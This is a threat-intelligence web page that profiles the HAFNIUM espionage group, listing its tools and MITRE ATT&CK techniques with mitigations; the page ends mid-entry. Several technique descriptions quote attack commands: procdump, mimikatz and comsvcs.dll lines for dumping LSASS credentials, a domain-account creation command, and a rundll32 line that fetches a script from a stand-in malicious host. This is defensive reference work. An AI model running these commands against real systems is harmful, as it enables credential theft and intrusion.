
        <!DOCTYPE html>
        <html style="font-size: 16px;">
          <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta charset="utf-8">
            <meta name="keywords" content="90+%, 80% - 89%, 70% - 79%, 60% - 69%, 50% - 59%, APT Name - % Match, Description, Associated Groups, Tactics/Techniques">
            <meta name="description" content="">
            <meta name="page_type" content="np-template-header-footer-from-plugin"><title>G0125</title>
            <link rel="stylesheet" href="nicepage.css" media="screen">
        <link rel="stylesheet" href="groupPage.css" media="screen">
            <script class="u-script" type="text/javascript" src="jquery.js" defer=""></script>
            <script class="u-script" type="text/javascript" src="nicepage.js" defer=""></script>
            <meta name="generator" content="Nicepage 4.8.2, nicepage.com">
            <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i|Open+Sans:300,300i,400,400i,500,500i,600,600i,700,700i,800,800i">
            
            
            <script type="application/ld+json">{
                        "@context": "http://schema.org",
                        "@type": "Organization",
                        "name": "",
                        "logo": "images/raptor.png",
                        "sameAs": [
                                        "https://github.com/redbeardmeric/APTAnalyzer",
                                        "https://attack.mitre.org/"
                        ]
        }</script>
            <meta name="theme-color" content="#478ac9"><meta property="og:title" content="G0125">
            <meta property="og:type" content="website">
          </head>
          <body class="u-body u-xl-mode"><header class="u-border-3 u-border-custom-color-1 u-clearfix u-header u-header" id="sec-2f7b"><div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
                <a href="https://nicepage.com" class="u-image u-logo u-image-1" data-image-width="256" data-image-height="256">
                  <img src="images/raptor.png" class="u-logo-image u-logo-image-1">
                </a>
                <nav class="u-menu u-menu-dropdown u-offcanvas u-menu-1">
                  <div class="menu-collapse" style="font-size: 1rem; letter-spacing: 0px;">
                    <a class="u-button-style u-custom-left-right-menu-spacing u-custom-padding-bottom u-custom-text-active-color u-custom-text-color u-custom-text-hover-color u-custom-top-bottom-menu-spacing u-nav-link u-text-active-palette-1-base u-text-hover-palette-2-base" href="#">
                      <svg class="u-svg-link" viewBox="0 0 24 24"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#menu-hamburger"></use></svg>
                      <svg class="u-svg-content" version="1.1" id="menu-hamburger" viewBox="0 0 16 16" x="0px" y="0px" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg"><g><rect y="1" width="16" height="2"></rect><rect y="7" width="16" height="2"></rect><rect y="13" width="16" height="2"></rect>
        </g></svg>
                    </a>
                  </div>
                  <div class="u-custom-menu u-nav-container">
                    <ul class="u-nav u-unstyled u-nav-1"><li class="u-nav-item"><a class="u-button-style u-nav-link u-text-active-white u-text-custom-color-1 u-text-hover-white" href="Home.html" style="padding: 10px 20px;">Home</a>
        </li><li class="u-nav-item"><a class="u-button-style u-nav-link u-text-active-white u-text-custom-color-1 u-text-hover-white" href="About.html" style="padding: 10px 20px;">About</a>
        </li></ul>
                  </div>
                  <div class="u-custom-menu u-nav-container-collapse">
                    <div class="u-black u-container-style u-inner-container-layout u-opacity u-opacity-95 u-sidenav">
                      <div class="u-inner-container-layout u-sidenav-overflow">
                        <div class="u-menu-close"></div>
                        <ul class="u-align-center u-nav u-popupmenu-items u-unstyled u-nav-2"><li class="u-nav-item"><a class="u-button-style u-nav-link" href="Home.html">Home</a>
        </li><li class="u-nav-item"><a class="u-button-style u-nav-link" href="About.html">About</a>
        </li></ul>
                      </div>
                    </div>
                    <div class="u-black u-menu-overlay u-opacity u-opacity-70"></div>
                  </div>
                </nav>
              </div></header>
            <section class="u-align-center u-clearfix u-grey-5 u-section-1" id="sec-c48b">
              <div class="u-clearfix u-expanded-width u-layout-wrap u-layout-wrap-1">
                <div class="u-layout">
                  <div class="u-layout-row">
                    <div class="u-black u-container-style u-layout-cell u-size-15 u-layout-cell-1">
                      <div class="u-border-3 u-border-custom-color-1 u-container-layout u-container-layout-1"><h2 class="u-align-center u-subtitle u-text u-text-custom-color-1 u-text-1">90+%</h2><a href="G0130.html" data-page-id="G0130" class="u-border-1 u-border-active-custom-color-1 u-border-hover-custom-color-1 u-btn u-button-style u-none u-text-custom-color-1 u-btn-1">Ajax Security Team</a><h2 class="u-align-center u-subtitle u-text u-text-custom-color-1 u-text-2">80% - 89%</h2><a href="G0032.html" data-page-id="G0032" class="u-border-1 u-border-active-custom-color-1 u-border-hover-custom-color-1 u-btn u-button-style u-none u-text-custom-color-1 u-btn-1">Lazarus Group</a><h2 class="u-align-center u-subtitle u-text u-text-custom-color-1 u-text-3">70% - 79%</h2><a href="G0035.html" data-page-id="G0035" class="u-border-1 u-border-active-custom-color-1 u-border-hover-custom-color-1 u-btn u-button-style u-none u-text-custom-color-1 u-btn-1">Dragonfly</a><h2 class="u-align-center u-subtitle u-text u-text-custom-color-1 u-text-4">60% - 69%</h2><a href="G0006.html" data-page-id="G0006" class="u-border-1 u-border-active-custom-color-1 u-border-hover-custom-color-1 u-btn u-button-style u-none u-text-custom-color-1 u-btn-1">APT1</a><a href="G0080.html" data-page-id="G0080" class="u-border-1 u-border-active-custom-color-1 u-border-hover-custom-color-1 u-btn u-button-style u-none u-text-custom-color-1 u-btn-1">Cobalt Group</a><h2 class="u-align-center u-subtitle u-text u-text-custom-color-1 u-text-5">50% - 59%</h2><a href="G0100.html" data-page-id="G0100" class="u-border-1 u-border-active-custom-color-1 u-border-hover-custom-color-1 u-btn u-button-style u-none u-text-custom-color-1 u-btn-1">Inception</a><a href="G0125.html" data-page-id="G0125" class="u-border-1 u-border-active-custom-color-1 u-border-hover-custom-color-1 u-btn u-button-style u-none u-text-custom-color-1 u-btn-1">HAFNIUM</a>
                      </div>
                    </div>
                    <div class="u-black u-container-style u-layout-cell u-size-45 u-layout-cell-2">
                      <div class="u-border-3 u-border-custom-color-1 u-container-layout u-container-layout-2">
                        <h1 class="u-align-left u-text u-text-custom-color-1 u-title u-text-6">HAFNIUM</h1>
                        <p class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-8">[HAFNIUM](https://attack.mitre.org/groups/G0125) is a likely state-sponsored cyber espionage group operating out of China that has been active since at least January 2021. [HAFNIUM](https://attack.mitre.org/groups/G0125) primarily targets entities in the US across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs.(Citation: Microsoft HAFNIUM March 2020)(Citation: Volexity Exchange Marauder March 2021)</p>
                        <h2 class="u-align-left u-subtitle u-text u-text-custom-color-1 u-text-default u-text-9">Associated Groups<br></h2>
                        <p class="u-align-left u-text u-text-custom-color-1 u-text-default u-text-10">Operation Exchange Marauder</p>
                         <h2 class="u-align-left u-subtitle u-text u-text-custom-color-1 u-text-default u-text-11">Software</h2><p class="u-align-left u-text u-text-custom-color-1 u-text-12">ASPXSpy</p>
                        <details>
                            <summary>Description</summary>
                            <p>[ASPXSpy](https://attack.mitre.org/software/S0073) is a Web shell. It has been modified by [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors to create the ASPXTool version. (Citation: Dell TG-3390)</p>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">China Chopper</p>
                        <details>
                            <summary>Description</summary>
                            <p>[China Chopper](https://attack.mitre.org/software/S0020) is a [Web Shell](https://attack.mitre.org/techniques/T1505/003) hosted on Web servers to provide access back into an enterprise network that does not rely on an infected system calling back to a remote command and control server. (Citation: Lee 2013) It has been used by several threat groups. (Citation: Dell TG-3390) (Citation: FireEye Periscope March 2018)(Citation: CISA AA21-200A APT40 July 2021)</p>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">PsExec</p>
                        <details>
                            <summary>Description</summary>
                            <p>[PsExec](https://attack.mitre.org/software/S0029) is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers. (Citation: Russinovich Sysinternals) (Citation: SANS PsExec)</p>
                        </details>
                     <h2 class="u-align-left u-subtitle u-text u-text-custom-color-1 u-text-default u-text-11">Techniques</h2><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Archive Collected Data: Archive via Utility</p>
                        <details>
                            <summary>Description</summary>
                            <p>An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip(Citation: 7zip Homepage), WinRAR(Citation: WinRAR Homepage), and WinZip(Citation: WinZip Homepage). Most utilities include functionality to encrypt and/or compress data.

Some 3rd party utilities may be preinstalled, such as `tar` on Linux and macOS or `zip` on Windows systems.</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Gather Victim Host Information: Client Configurations</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Create Account: Domain Account</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.

Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Multi-factor Authentication - Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.</p>
                            <p>Network Segmentation - Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.</p>
                            <p>Operating System Configuration - Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.</p>
                            <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Gather Victim Identity Information: Email Addresses</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.

Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Exfiltration Over Web Service: Exfiltration to Cloud Storage</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.

Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. </p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Exploitation for Client Execution</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.

Several types exist:

### Browser-based Exploitation

Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.

### Office Applications

Common office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.

### Common Third-party Applications

Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Application Isolation and Sandboxing - Restrict execution of code to a virtual environment on or in transit to an endpoint system.</p>
                            <p>Exploit Protection - Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Gather Victim Network Information</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Gather Victim Network Information: IP Addresses</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Ingress Tool Transfer</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">OS Credential Dumping: LSASS Memory</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run using:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

Built-in Windows tools such as comsvcs.dll can also be used:

* <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)


Windows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)

The following SSPs can be used to access credentials:

* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)
* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)
</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
                            <p>Credential Access Protection - Use capabilities to prevent successful credential access by adversaries; including blocking forms of credential dumping.</p>
                            <p>Operating System Configuration - Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.</p>
                            <p>Password Policies - Set and enforce secure password policies for accounts.</p>
                            <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
                            <p>Privileged Process Integrity - Protect processes with high privileges that can be used to interact with critical system components through use of protected process light, anti-process injection defenses, or other process integrity enforcement measures.</p>
                            <p>User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Valid Accounts: Local Accounts</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.

Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. </p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Password Policies - Set and enforce secure password policies for accounts.</p>
                            <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">OS Credential Dumping: NTDS</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)

In addition to looking for NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.(Citation: Metcalf 2015)

The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy
</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Encrypt Sensitive Information - Protect sensitive information with strong encryption.</p>
                            <p>Password Policies - Set and enforce secure password policies for accounts.</p>
                            <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
                            <p>User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Non-Application Layer Protocol</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).

ICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution)
 Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Filter Network Traffic - Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.</p>
                            <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
                            <p>Network Segmentation - Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Command and Scripting Interpreter: PowerShell</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</p>
                            <p>Code Signing - Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.</p>
                            <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
                            <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
                            <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Email Collection: Remote Email Collection</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Encrypt Sensitive Information - Protect sensitive information with strong encryption.</p>
                            <p>Multi-factor Authentication - Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Signed Binary Proxy Execution: Rundll32</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).

Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll)</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Exploit Protection - Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Data Encoding: Standard Encoding</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Acquire Infrastructure: Virtual Private Server</p>
                        <details>
                            <summary>Description</summary>
                            <p>Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.

Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)</p>
                    <details>
                        <summary>Mitigations</summary>
                            <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p></details>
                        </details><p class="u-align-left u-text u-text-custom-color-1 u-text-12">Application Layer Protocol: Web Protocols</p>
                        <details>
                            <summary>Description</summary>
